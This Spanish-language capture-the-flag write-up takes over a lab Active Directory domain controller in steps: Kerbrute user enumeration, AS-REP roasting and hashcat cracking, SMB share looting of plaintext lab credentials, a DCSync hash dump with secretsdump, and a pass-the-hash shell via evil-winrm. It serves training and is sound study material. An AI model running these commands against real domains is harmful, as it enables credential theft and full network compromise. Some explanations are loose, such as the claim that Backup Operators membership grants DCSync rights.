# Attacktive Directory

Conceptos clave: Active Directory, Kerberos Enumeration (Kerbrute), AS-REP Roasting (Impacket), SMB Share Enumeration, DCSync Attack (Secretsdump), Pass-the-Hash (Evil-WinRM)
Dificultad: Media
Fecha: 27 de junio de 2026

## Resumen
Compromiso total de un Controlador de Dominio (Domain Controller) en un entorno **Active Directory**. La auditoría comenzó con la enumeración de usuarios válidos abusando del servicio Kerberos mediante `Kerbrute`. Posteriormente, se identificó una cuenta sin el requisito de preautenticación de Kerberos, lo que permitió ejecutar un ataque **AS-REP Roasting** para obtener y crackear su *hash*. Con este acceso inicial, se enumeraron los recursos compartidos SMB, descubriendo credenciales en texto plano de una cuenta de copias de seguridad. Finalmente, abusando de los privilegios de replicación de dicha cuenta, se ejecutó un ataque **DCSync** para extraer los *hashes* de la base de datos `NTDS.dit`, culminando en un ataque **Pass-the-Hash** para obtener una *shell* interactiva como `Administrator`.

---

## 1. Reconocimiento (Recon)

### 1.1 Escaneo de Puertos e Identificación del Dominio
Se realizó un escaneo inicial con Nmap para identificar la topología del servidor:

```bash
nmap -p- --open -T4 -n -sS -v <IP>
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -sC -sV <IP>
```

**Hallazgos críticos de Active Directory:**
* `88/tcp`: Kerberos.
* `139/tcp`, `445/tcp`: SMB.
* `389/tcp`: LDAP. Reveló el nombre del dominio DNS: `spookysec.local`.

Para permitir la correcta resolución de nombres en las herramientas de ataque, se añadió el dominio al archivo `/etc/hosts` de la máquina atacante:
```bash
echo "<IP> spookysec.local" | sudo tee -a /etc/hosts
```

---

## 2. Acceso Inicial (Initial Access)

### 2.1 Enumeración de Usuarios (Kerbrute)
Sabiendo que el puerto 88 (Kerberos) estaba expuesto, se utilizó **Kerbrute** para realizar una enumeración de usuarios válida sin generar bloqueos de cuenta, interactuando directamente con el KDC (Key Distribution Center):

```bash
kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```
**Resultado:** Se confirmaron varios usuarios válidos, destacando `svc-admin` y `backup`.

### 2.2 AS-REP Roasting (Impacket)
Se evaluó si alguna de las cuentas descubiertas tenía deshabilitada la opción *"Do not require Kerberos preauthentication"*. Si esta configuración es vulnerable, el KDC devolverá un *ticket* TGT cifrado con la contraseña del usuario, el cual puede ser crackeado *offline*.

Se utilizó el script `GetNPUsers.py` de la suite **Impacket**:

```bash
impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip <IP>
```
**Resultado:** El servidor devolvió el *hash* Kerberos 5 AS-REP (etype 23) del usuario `svc-admin`.

### 2.3 Cracking del Hash (Hashcat)
Se guardó el *hash* en un archivo (`hash.txt`) y se procedió a su ruptura *offline* utilizando **Hashcat** con el modo 18200 y el diccionario *rockyou*:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
**Credencial obtenida:** `svc-admin` : `management2005`

---

## 3. Movimiento Lateral y Escalada (Lateral Movement)

### 3.1 Enumeración SMB
Con credenciales válidas en el dominio, se procedió a listar los recursos compartidos accesibles utilizando `smbclient`:

```bash
smbclient -L //spookysec.local -U svc-admin
```
Se identificó un recurso inusual llamado `backup`. Se accedió al mismo para inspeccionar su contenido:

```bash
smbclient //spookysec.local/backup -U svc-admin
```
**Hallazgo:** En el interior del recurso se encontró un archivo de texto (`backup_credentials.txt`) que contenía la contraseña en texto plano cifrada en Base64 de la cuenta `backup` (`backup@spookysec.local` : `backup2517860`).

---

## 4. Post-Explotación y Compromiso Total (Domain Compromise)

### 4.1 Extracción de Hashes (DCSync Attack)
La cuenta `backup` suele pertenecer al grupo *Backup Operators*, el cual posee privilegios suficientes para solicitar la replicación de datos del Directorio Activo. Se abusó de este privilegio para realizar un ataque **DCSync** mediante `secretsdump.py` de Impacket, logrando volcar el contenido de la base de datos `NTDS.dit` (donde residen los *hashes* NTLM de todo el dominio).

```bash
impacket-secretsdump backup:backup2517860@spookysec.local
```
**Resultado:** Se volcaron todos los *hashes* del sistema, capturando de manera crítica el *hash* NTLM de la cuenta `Administrator`.

### 4.2 Pass-The-Hash (Evil-WinRM)
En lugar de intentar crackear la contraseña del Administrador, se utilizó la técnica **Pass-the-Hash** para autenticarse directamente aprovechando el protocolo WinRM (puerto 5985). Para ello, se utilizó la herramienta `evil-winrm`:

```bash
evil-winrm -i <IP> -u Administrator -H <HASH_NTLM_ADMINISTRATOR>
```

**Resultado:** Se obtuvo una *shell* interactiva (`PS >`) con privilegios máximos (`NT AUTHORITY\SYSTEM` equivalentes como Domain Admin), comprometiendo por completo el Controlador de Dominio y capturando las banderas restantes.
